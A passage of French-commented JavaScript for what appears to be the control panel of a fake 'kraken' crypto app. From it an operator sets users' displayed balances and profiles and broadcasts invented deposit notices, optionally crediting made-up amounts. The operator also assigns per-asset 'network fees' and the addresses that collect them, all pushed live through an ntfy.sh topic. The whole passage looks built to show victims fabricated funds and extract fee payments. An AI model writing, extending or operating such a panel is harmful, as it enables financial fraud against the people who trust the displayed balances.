    if (!p || p.app !== "kraken") return;
    const t = Number(m.time) || 0;
    if (p.type === "feeOrder" && p.order) {
      if (mergeFeeOrder(p.order)) { save(); renderFeeOrders(); }
      return;
    }
    if (p.type === "state" && p.state) {
      const seen = Number(ST.msgTime) || 0;
      if (t > seen || Number(p.state.rev) !== (Number(ST.rev) || 0)) {
        ST.msgTime = Math.max(t, seen);
        if (applyState(p.state)) { ensureAddresses(); renderAll(); }
        save();
      }
    }
  }

  function openStream() {
    if (typeof EventSource === "undefined") return;
    try {
      const es = new EventSource("https://ntfy.sh/" + TOPIC + "/sse");
      es.onmessage = ev => { try { ingestLive(JSON.parse(ev.data)); } catch { } };
      es.onopen = () => setLive(true);
      // onerror : EventSource se reconnecte seul ; le poll de 30 s couvre l'intervalle.
    } catch { /* flux indisponible, on garde le poll */ }
  }


  // ── actions ──────────────────────────────────────────────────────────
  let tT;
  function toast(m) {
    const t = $("#toast");
    t.textContent = m; t.classList.add("on");
    clearTimeout(tT); tT = setTimeout(() => t.classList.remove("on"), 2300);
  }

  const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[A-Za-z]{2,}$/;
  const USER_RE = /^[a-z0-9._-]{3,24}$/;

  // Seul point d'ecriture du profil. L'app n'a aucun champ editable : elle
  // affiche ce que cette fonction publie.
  async function saveIdentity() {
    const first = $("#aFirst").value.trim();
    const email = $("#aMail").value.trim();
    const user = $("#aUser").value.trim().toLowerCase();
    if (!first) return toast("Le pr\u00e9nom est obligatoire");
    if (!EMAIL_RE.test(email)) return toast("Adresse e-mail invalide");
    if (user && !USER_RE.test(user)) return toast("Nom d'utilisateur : 3 \u00e0 24 caract\u00e8res, a-z 0-9 . _ -");
    ST.first = first;
    ST.last = $("#aLast").value.trim();
    ST.email = email;
    ST.username = user || first.toLowerCase().replace(/[^a-z0-9]/g, "").slice(0, 24) || "compte";
    ST.phone = $("#aPhone").value.trim();
    ST.dob = $("#aDob").value.trim();
    ST.country = $("#aCountry").value.trim();
    ST.postal = $("#aAddr").value.trim();
    ST.rev = Math.max(Date.now(), (Number(ST.rev) || 0) + 1);
    save();
    // Deux envois : l'etat complet (soldes + profil) et le profil seul.
    // Si l'un passe, le profil est a jour cote app.
    const okState = await publish({ type: "state", state: snapshot() });
    const okProf = await publish({ type: "profile", profile: profileOf() });
    const ok = okState || okProf;
    if (!ok) setPending(true);
    renderAll();
    toast(ok ? "Profil mis \u00e0 jour sur tous les appareils" : "Publication en attente - nouvel essai automatique");
  }

  async function saveAccount() {
    ST.first = $("#aFirst").value.trim() || "bernard";
    ST.last = $("#aLast").value.trim();
    ST.email = $("#aMail").value.trim() || ST.email;
    ST.cash = Math.max(0, parseAmt($("#aCash").value));
    ST.gas = Math.max(0, parseAmt($("#aGas").value));
    const ok = await publishState();
    renderAll();
    toast(ok ? "Compte mis à jour sur tous les appareils" : "Publication en attente - nouvel essai automatique");
  }

  async function saveWallet() {
    $$("[data-bal]").forEach(inp => {
      const v = Math.max(0, parseAmt(inp.value));
      if (v > 0) ST.balances[inp.dataset.bal] = v;
      else delete ST.balances[inp.dataset.bal];
    });
    $$("[data-fee]").forEach(inp => {
      const v = Math.max(0, parseAmt(inp.value));
      if (v > 0) ST.fees[inp.dataset.fee] = v;
      else delete ST.fees[inp.dataset.fee];
    });
    ST.usdcFee = ST.usdcFee || {};
    // Champ USDC de la liste : une valeur ici s'applique a tous les reseaux.
    // Les champs detailles plus bas, s'ils sont remplis, restent prioritaires.
    const uAllInp = $("[data-usdcall]");
    const uAll = uAllInp ? Math.max(0, parseAmt(uAllInp.value)) : 0;
    if (uAll > 0) {
      // Une valeur dans le champ USDC de la liste vaut pour tous les reseaux.
      // Les champs detailles restent prioritaire seulement s'ils ont ete
      // edites APRES coup : on les remet d'abord a la valeur globale.
      USDC_NETS.forEach(n => { ST.usdcFee[n.id] = uAll; });
      $$("[data-unet]").forEach(inp => { inp.value = String(uAll).replace(".", ","); });
    } else {
      $$("[data-unet]").forEach(inp => {
        const raw = String(inp.value || "").trim();
        const v = Math.max(0, parseAmt(raw));
        if (v > 0) ST.usdcFee[inp.dataset.unet] = v;
        else delete ST.usdcFee[inp.dataset.unet];
      });
    }
    const ok = await publishState();
    renderAll();
    toast(ok ? "Portefeuille synchronisé" : "Publication en attente - nouvel essai automatique");
  }

  function pushJournal(o) {
    const list = journal();
    list.unshift(o);
    localStorage.setItem(JKEY, JSON.stringify(list.slice(0, 60)));
    renderLog();
  }

  async function sendDeposit() {
    const amount = Math.max(0, parseAmt($("#dAmount").value));
    if (!(amount > 0)) return toast("Saisissez le montant reçu");
    const addr = $("#dAddr").value.trim() || ST.addresses[DSYM] || "";
    const label = DSYM === "EUR" ? eur(amount) : qtyTxt(amount, DSYM);
    const text = $("#dText").value.trim() || ("Dépôt de " + label + " reçu sur votre compte");
    const credit = $("#dCredit").checked;

    if (credit) {
      if (DSYM === "EUR") ST.cash = Math.max(0, (Number(ST.cash) || 0) + amount);
      else ST.balances[DSYM] = (Number(ST.balances[DSYM]) || 0) + amount;
      ST.rev = Date.now();
      save();
    }

    const id = "d" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const jobs = [publish({ type: "notify", id, kind: "deposit", asset: DSYM, amount, addr, text })];
    if (credit) jobs.push(publish({ type: "state", state: snapshot() }));

    pushJournal({ id, kind: "deposit", asset: DSYM, amount, addr, text, at: Date.now() });
    const res = await Promise.all(jobs);
    renderAll();
    toast(res.some(Boolean) ? (credit ? "Dépôt envoyé et compte crédité" : "Dépôt envoyé à tous les utilisateurs") : "Hors ligne — dépôt non diffusé");
    if (res[0]) { $("#dAmount").value = ""; $("#dText").value = ""; }
  }

  async function sendNotice() {
    const text = $("#nText").value.trim();
    if (!text) return toast("Saisissez le message");
    const id = "n" + Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
    const ok = await publish({ type: "notify", id, kind: "notice", text });
    pushJournal({ id, kind: "notice", text, at: Date.now() });
    toast(ok ? "Notification envoyée à tous les utilisateurs" : "Hors ligne — notification non diffusée");
    if (ok) $("#nText").value = "";
  }

  // ── navigation ───────────────────────────────────────────────────────
  function tab(name) {
    $$(".view").forEach(v => v.classList.toggle("on", v.id === "v-" + name));
    $$(".tab").forEach(t => t.classList.toggle("on", t.dataset.tab === name));
    if (location.hash.slice(1) !== name) history.replaceState(null, "", "#" + name);
    scrollTo({ top: 0 });
  }

  $("#tabs").addEventListener("click", e => {
    const b = e.target.closest("[data-tab]");
    if (b) tab(b.dataset.tab);
  });

  $("#saveAccount").addEventListener("click", saveAccount);
  $("#saveIdentity")?.addEventListener("click", saveIdentity);
  // Une frappe dans le champ USDC global se propage aux six reseaux : plus de
  // valeur perimee (2,4) qui reprend le dessus au moment d'enregistrer.
  document.addEventListener("input", e => {
    const el = e.target;
    if (!el || !el.matches || !el.matches("[data-usdcall]")) return;
    const v = String(el.value || "");
    if (!(parseAmt(v) > 0)) return;
    $$("[data-unet]").forEach(inp => { inp.value = v; });
  });

  // A l'inverse, editer un reseau a la main vide le champ global : le detail
  // redevient prioritaire et la valeur globale ne l'ecrase plus a l'enregistrement.
  document.addEventListener("input", e => {
    const el = e.target;
    if (!el || !el.matches || !el.matches("[data-unet]")) return;
    const all = $("[data-usdcall]");
    if (all) all.value = "";
  });

  // Chaque carte de frais a son propre bouton : plus besoin de descendre
  // jusqu'au bouton global du portefeuille pour publier.
  ["#saveFeesAssets", "#saveFeesUsdc"].forEach(sel => {
    const b = $(sel);
    if (b) b.addEventListener("click", saveWallet);
  });
  $("#saveFeeAddrAll")?.addEventListener("click", saveAllAddresses);

  // Frais : liste live + fiche éditable.
  $("#feeOrderNew")?.addEventListener("click", () => { FEE_EDIT = "new"; renderFeeOrders(); });
  $("#feeOrderList")?.addEventListener("click", feeListClick);
  $("#feeEditor")?.addEventListener("click", feeEditorClick);
  $("#feeEditor")?.addEventListener("input", feeEditorInput);

  $("#saveWallet").addEventListener("click", saveWallet);
  $("#dSend").addEventListener("click", sendDeposit);
  $("#nSend").addEventListener("click", sendNotice);
  $("#syncNow").addEventListener("click", async () => { await poll(); toast("Synchronisé"); });
  $("#dCopy").addEventListener("click", () => {
    navigator.clipboard?.writeText(ST.addresses[DSYM] || "");
    toast("Adresse copiée");
  });
  $("#dRegen").addEventListener("click", () => {
    const inp = $("#dEdit");
    inp.value = genAddr(DSYM);
    addrDirty = true;
    inp.focus();
    try { inp.select(); } catch { }
    toast("Adresse générée - modifie-la puis Enregistrer");
  });
  $("#dSaveAddr")?.addEventListener("click", async () => {
    const v = $("#dEdit").value.trim();
    if (v.length < 10) return toast("Adresse trop courte");
    ST.addresses[DSYM] = v;
    addrDirty = false;
    const ok = await publishState();
    renderAll();
    toast(ok ? "Adresse publiée sur tous les appareils" : "Adresse enregistrée localement");
  });
  $("#clearLog").addEventListener("click", () => {
    localStorage.removeItem(JKEY); renderLog(); toast("Journal vidé");
  });
  // Une frappe dans une adresse bloque le re-rendu tant qu'elle n'est pas
  // publiee : la synchro ne doit pas effacer la saisie personnalisee.
  ["#addrRows", "#dEdit"].forEach(sel => {
    const el = document.querySelector(sel);
    if (el) el.addEventListener("input", () => { addrDirty = true; });
  });

  // Adresse qui encaisse les frais réseau, actif par actif (ex. les frais ETH).
  function renderFeeAddresses() {
    const box = $("#feeAddrRows");
    if (!box) return;
    box.innerHTML = [...COINS, EUR].map(c => {
      const v = (ST.feeAddresses || {})[c.sym] || "";
      return `<div class="addrrow">
        <span class="sym">${c.sym}</span>
        <span class="addrfields">
          <span class="addrline">
            <input data-feeaddr="${c.sym}" spellcheck="false" autocomplete="off"
                   value="${v}" placeholder="Même adresse que la réception">
            <button type="button" class="regen-mini" data-copyfee="${c.sym}" title="Copier l'adresse de frais ${c.sym}">Copier</button>
            <button type="button" class="regen-mini" data-samefee="${c.sym}" title="Copier l'adresse de réception de ${c.sym}">= Réception</button>
          </span>
        </span>
      </div>`;
    }).join("");
  }

  // Régénérer par actif : le champ est rempli, jamais publié ni écrasé
  // tant que l'utilisateur n'a pas cliqué sur Publier les adresses.
  function copyText(v) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      return navigator.clipboard.writeText(v).then(() => true).catch(() => false);
    }
    try {
      const ta = document.createElement("textarea");
      ta.value = v;
      ta.style.position = "fixed";
      ta.style.opacity = "0";
      document.body.appendChild(ta);
      ta.select();
      const ok = document.execCommand("copy");
      document.body.removeChild(ta);
      return Promise.resolve(ok);
    } catch { return Promise.resolve(false); }
  }

  $("#feeAddrRows")?.addEventListener("click", e => {
    const cp = e.target.closest("[data-copyfee]");
    if (cp) {
      const inp = document.querySelector('[data-feeaddr="' + cp.dataset.copyfee + '"]');
      const v = inp ? inp.value.trim() : "";
      if (!v) return toast("Aucune adresse de frais à copier");
      copyText(v).then(ok => toast(ok ? "Adresse de frais " + cp.dataset.copyfee + " copiée" : "Copie refusée par le navigateur"));
      return;
    }
    const same = e.target.closest("[data-samefee]");
    if (same) {
      const sym = same.dataset.samefee;
      const inp = document.querySelector('[data-feeaddr="' + sym + '"]');
      if (!inp) return;
      inp.value = ST.addresses[sym] || "";
      toast("Adresse de réception " + sym + " recopiée — pense à publier");
    }
  });

  $("#addrRows")?.addEventListener("click", e => {
    const cp = e.target.closest("[data-copy]");
    if (cp) {
      const inp = document.querySelector('[data-addr="' + cp.dataset.copy + '"]');
      const v = inp ? inp.value.trim() : "";
      if (!v) return toast("Aucune adresse à copier");
      copyText(v).then(ok => toast(ok ? "Adresse " + cp.dataset.copy + " copiée" : "Copie refusée par le navigateur"));
      return;
    }
    const b = e.target.closest("[data-regen]");
    if (!b) return;
    const sym = b.dataset.regen;
    const inp = document.querySelector('[data-addr="' + sym + '"]');
    if (!inp) return;
    inp.value = genAddr(sym);
    addrDirty = true;
    inp.focus();
    try { inp.select(); } catch { }
    toast("Adresse " + sym + " générée - modifie-la puis Publier les adresses");
  });
  $("#saveAddrAll")?.addEventListener("click", saveAllAddresses);
  $("#regenAddrAll")?.addEventListener("click", regenAllAddresses);

  $("#walletGrid").addEventListener("click", e => {
    const b = e.target.closest("[data-add]");
    if (!b) return;
    const s = b.dataset.add;
    if (!(s in ST.balances)) ST.balances[s] = 0;
    renderWallet();
    toast(s + " ajouté au portefeuille");
  });

  $("#depGrid").addEventListener("click", e => {
    const b = e.target.closest("[data-dep]");
    if (!b) return;
    DSYM = b.dataset.dep;
    renderDeposit();
  });

  addEventListener("scroll", () => {
    const t = $("#top");
    if (t) t.classList.toggle("scrolled", scrollY > 4);
  }, { passive: true });

  document.addEventListener("visibilitychange", () => {
    if (document.hidden) return;
    poll();
    if (pendingPub) {
      publish({ type: "state", state: snapshot() }).then(ok => {
        if (ok) { setPending(false); renderSync(); }
      });
    }
  });

  // ── démarrage ────────────────────────────────────────────────────────
  ensureAddresses();
  renderAll();
  const bootTab = location.hash.slice(1);
  if (["account", "wallet", "fees", "deposit", "log"].includes(bootTab)) tab(bootTab);
  poll();
  openStream();
  // Une publication restee en attente (limite ntfy) repart des l'ouverture.
  if (pendingPub) {
    publish({ type: "state", state: snapshot() }).then(ok => {
      if (ok) { setPending(false); renderSync(); }
    });
  }
  setInterval(poll, 30000);
  // Tant que ntfy refuse la publication (429), un nouvel essai part toutes
  // les 20 s : le frais enregistre ne reste jamais coince en local.
  setInterval(async () => {
    if (!pendingPub) return;
    const ok = await publish({ type: "state", state: snapshot() });
    if (ok) { setPending(false); renderSync(); setLive(true); }
  }, 20000);
})();
